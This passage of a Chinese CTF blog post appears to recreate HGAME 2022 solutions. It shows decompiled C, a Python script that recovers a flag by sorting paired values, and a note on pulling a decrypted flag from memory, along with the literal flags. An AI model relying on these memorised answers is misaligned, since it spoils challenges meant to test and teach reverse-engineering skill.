*&amp;v7[<span class="number">4</span> * j - <span class="number">4</span>] + <span class="number">1</span>]; ++j )</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( j != <span class="number">89</span> );</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">88</span>; ++k )</span><br><span class="line">  <span class="built_in">putchar</span>(a[<span class="number">2</span> * *&amp;v7[<span class="number">4</span> * k]]);</span><br></pre></td></tr></table></figure></li>
<li><pre><code class="python">#用第二个数做冒泡排序，并按顺序输出flag
key=[48,20093,48,26557,48,31304,48,33442,48,37694,49,39960,50,23295,50,27863,50,42698,50,48505,50,52925, 51,12874,51,12946,51,14597,51,17041,51,23262,51,28319,51,42282,51,48693,51,52067,53,32571,56,14612,56,45741,57,14554,57,20048,57,27138,57,45327,66,30949,95,32502,95,35235,95,36541,95,38371,97,29658,100,21388,100,25403,100,40604,100,46987,100,51302,101,12974,101,30329,102,10983,102,19818,102,22280,102,26128,102,41560,102,47116,102,51333,103,28938,103,31988,104,16246,104,28715,104,41966,104,44368,104,47815,105,16420,105,35362,105,49237,106,11090,106,50823,107,24320,107,50199,108,24962,109,30171,110,15457,110,18838,110,24001,111,11638,111,32023,111,43291,112,39661,114,17872,114,33895,114,43869,115,20611,115,25122,115,36243,115,37434,115,38686,115,46266,115,51077,116,13656,116,34493,116,38712,117,14096,117,38777,119,12095,119,17629,123,30945,125,40770]

def bubbleSort(arr):  #冒泡排序
  n = len(arr)
  # 遍历所有数组元素
  for i in range(n):
    # Last i elements are already in place
    for j in range(0, n - i - 1):
      if arr[j] &gt; arr[j + 1]:
        arr[j], arr[j + 1] = arr[j + 1], arr[j]
key1=[20093, 26557, 31304, 33442, 37694, 39960, 23295, 27863, 42698, 48505, 52925, 12874, 12946, 14597, 17041, 23262, 28319, 42282, 48693, 52067, 32571, 14612, 45741, 14554, 20048, 27138, 45327, 30949, 32502, 35235, 36541, 38371, 29658, 21388, 25403, 40604, 46987, 51302, 12974, 30329, 10983, 19818, 22280, 26128, 41560, 47116, 51333, 28938, 31988, 16246, 28715, 41966, 44368, 47815, 16420, 35362, 49237, 11090, 50823, 24320, 50199, 24962, 30171, 15457, 18838, 24001, 11638, 32023, 43291, 39661, 17872, 33895, 43869, 20611, 25122, 36243, 37434, 38686, 46266, 51077, 13656, 34493, 38712, 14096, 38777, 12095, 17629, 30945, 40770]
sort=[10983, 11090, 11638, 12095, 12874, 12946, 12974, 13656, 14096, 14554, 14597, 14612, 15457, 16246, 16420, 17041, 17629, 17872, 18838, 19818, 20048, 20093, 20611, 21388, 22280, 23262, 23295, 24001, 24320, 24962, 25122, 25403, 26128, 26557, 27138, 27863, 28319, 28715, 28938, 29658, 30171, 30329, 30945, 30949, 31304, 31988, 32023, 32502, 32571, 33442, 33895, 34493, 35235, 35362, 36243, 36541, 37434, 37694, 38371, 38686, 38712, 38777, 39661, 39960, 40604, 40770, 41560, 41966, 42282, 42698, 43291, 43869, 44368, 45327, 45741, 46266, 46987, 47116, 47815, 48505, 48693, 49237, 50199, 50823, 51077, 51302, 51333, 52067, 52925]
flag=&quot;&quot;

for j in range(len(sort)):
  for i in range(len(key)):
    if(key[i]==sort[j]):
      flag+=chr(key[i-1])
print(flag)
&quot;&quot;&quot;bubbleSort(key1)
print(key1)&quot;&quot;&quot;
&quot;&quot;&quot;mm=[]
for i in range(1,len(key),2):
    mm.append(key[i])
print(mm)&quot;&quot;&quot;
#fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame&#123;B0go_50rt_is_s0_stup1d&#125;fh32orh98sdfh23ikjsdf32
</code></pre>
</li>
</ol>
<p>可得hgame{B0go_50rt_is_s0_stup1d}</p>
<h4 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h4><h5 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h5><h6 id="WOW"><a href="#WOW" class="headerlink" title="( WOW )"></a>( WOW )</h6><p><img src="/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220220113824461.png" alt="image-20220220113824461"></p>
<p>在上面两个循环内一个是加密一个是解密，只需要把密文改为Buf1，通过memcmp函数，再让Buf2通过解密函数可以直接在内存中得到</p>
<p>hgame{WOWOW_h@ppy_n3w_ye4r_2022}</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Hgame2022%E5%A4%8D%E7%8E%B0/" rel="tag"># Hgame2022复现</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/02/20/HGAME2022/" rel="prev" title="HGAME2022">
      <i class="fa fa-chevron-left"></i> HGAME2022
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/02/20/VNCTF2022%E5%85%AC%E5%BC%80%E8%B5%9B/" rel="next" title="VNCTF2022公开赛">
      VNCTF2022公开赛 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%99%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%98%AF%E8%87%AA%E5%B7%B1%E6%B2%A1%E6%9C%89%E8%A7%A3%E5%87%BA%E6%9D%A5%E7%9C%8B%E4%BA%86%E5%88%AB%E4%BA%BA%E7%9A%84wp%E5%A4%8D%E7%8E%B0%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E8%87%AA%E5%B7%B1%E8%A7%A3%E5%86%B3%E7%9A%84%E5%9C%A8%E4%B8%8A%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E3%80%82"><span class="nav-number">1.</span> <span class="nav-text">这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-Week1"><span class="nav-number">1.1.</span> <span class="nav-text">Level - Week1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#misc"><span class="nav-number">1.1.1.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%A5%BD%E5%BA%B7%E7%9A%84%E6%B5%81%E9%87%8F"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">好康的流量</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%99%E4%B8%AA%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%9C%89%E7%82%B9%E9%BA%BB%E7%83%A6"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">这个压缩包有点麻烦</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web"><span class="nav-number">1.1.2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Fujiwara-Tofu-Shop"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">Fujiwara Tofu Shop</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#easy-auth"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">easy_auth</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Crypto"><span class="nav-number">1.1.3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Dancing-Line"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">Dancing Line</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Matryoshka"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">Matryoshka</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Re"><span class="nav-number">1.1.4.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8C%AB%E5%A4%B4%E9%B9%B0%E6%98%AF%E4%B8%8D%E6%98%AF%E7%8C%AB"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">猫头鹰是不是猫</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Level-Week2"><span class="nav-number">1.1.5.</span> <span class="nav-text">Level - Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#fake-shell"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">fake shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#creakme2"><span class="nav-number">1.1.5.2.</span> <span class="nav-text">creakme2</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#upx-magic1"><span class="nav-number">1.1.5.3.</span> <span class="nav-text">upx magic1</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-1"><span class="nav-number">1.1.6.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Pokemon"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">Pokemon</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Apache"><span class="nav-number">1.1.6.2.</span> <span class="nav-text">Apache!</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%80%E6%9C%AC%E5%8D%95%E8%AF%8D%E4%B9%A6"><span class="nav-number">1.1.6.3.</span> <span class="nav-text">一本单词书</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Level-Week3"><span class="nav-number">1.1.7.</span> <span class="nav-text">Level - Week3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#web"><span class="nav-number">1.1.8.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#SecurityCenter"><span class="nav-number">1.1.8.1.</span> <span class="nav-text">SecurityCenter</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#LoginMe"><span class="nav-number">1.1.8.2.</span> <span class="nav-text">LoginMe</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#reverse"><span class="nav-number">1.1.8.3.</span> <span class="nav-text">reverse</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Answer%E2%80%99s-Windows"><span class="nav-number">1.1.8.4.</span> <span class="nav-text">Answer’s Windows</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#creakme3"><span class="nav-number">1.1.8.5.</span> <span class="nav-text">creakme3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Week4"><span class="nav-number">1.2.</span> <span class="nav-text">Week4</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Re-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#WOW"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">( WOW )</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="N9-zqc"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">N9-zqc</p>
  <div class="site-description" itemprop="description">主要有关ctf的学习笔记,主攻逆向和Web,联系方式QQ:2501152740</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">N9-zqc</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>
<% if (theme.busuanzi && theme.busuanzi.enable){ %>
        <!-- 不蒜子统计 -->
        <span id="busuanzi_container_site_pv">
                本站总访问量<span id="busuanzi_value_site_pv"></span>次
        </span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv" style='display:none'>
                本站访客数<span id="busuanzi_value_site_uv"></span>人
        </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <% } %>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
